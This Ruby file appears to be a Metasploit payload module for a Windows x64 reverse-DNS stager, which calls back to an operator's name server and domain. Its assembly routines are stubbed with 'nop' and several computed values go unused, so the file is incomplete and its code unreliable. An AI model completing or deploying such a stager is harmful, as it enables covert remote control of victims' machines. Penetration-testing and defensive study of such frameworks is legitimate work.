# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/x64/block_api'
require 'msf/core/payload/windows/x64/exitfunk'

module Msf

###
#
# Complex reverse_dns payload generation for Windows ARCH_X64
#
###

module Payload::Windows::ReverseDns_x64

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi_x64
  include Msf::Payload::Windows::Exitfunk_x64

  #
  # Generate the first stage
  #
  def generate(opts={})
    ds = opts[:datastore] || datastore
    conf = {
      ns_server:   ds['NS_SERVER'],
      domain:      ds['DOMAIN'],
      server_id:   ds['SERVER_ID'],
      retry_count: ds['ReverseConnectRetries'],
      reliable:    false
    }

    # Generate the advanced stager if we have space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = ds['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_dns(conf)
  end


  def transport_config(opts={})
    transport_config_reverse_dns(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_dns(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      and rsp, ~0xF          ;  Ensure RSP is 16 byte aligned
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      #{asm_functions_dns()}
      
      start:
        pop rbp     
      #{asm_reverse_dns(opts)}
      
    ^
    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # EXITFUNK 'thread' is the biggest by far, adds 29 bytes.
    space += 29

    # Reliability adds some bytes!
    space += 44

    # The final estimated size
    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [String]  :domain DOMAIN that wll be used for tunnel
  # @option opts [String]  :ns_server Optional: NS server, that will be used.
  # @option opts [Integer] :retry_count Number of retry attempts
  #
  def asm_reverse_dns(opts={})

    retry_count  = [opts[:retry_count].to_i, 1000].max
    domain       = "#{opts[:server_id]}.#{opts[:domain]}"    
    ns_server    = "0x%.8x" % Rex::Socket.addr_aton(opts[:ns_server]||"0.0.0.0").unpack("V").first
    domain_length= domain.length + 18
    
    alloc_stack  = (domain_length) + (4 - (domain_length % 4))
    reliable     = opts[:reliable]
    
    asm = %Q^
     nop

    ^
    
    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end
  
  
  def asm_functions_dns()
  
    asm = %Q^
     nop
    ^
    
    asm
  end


end

end
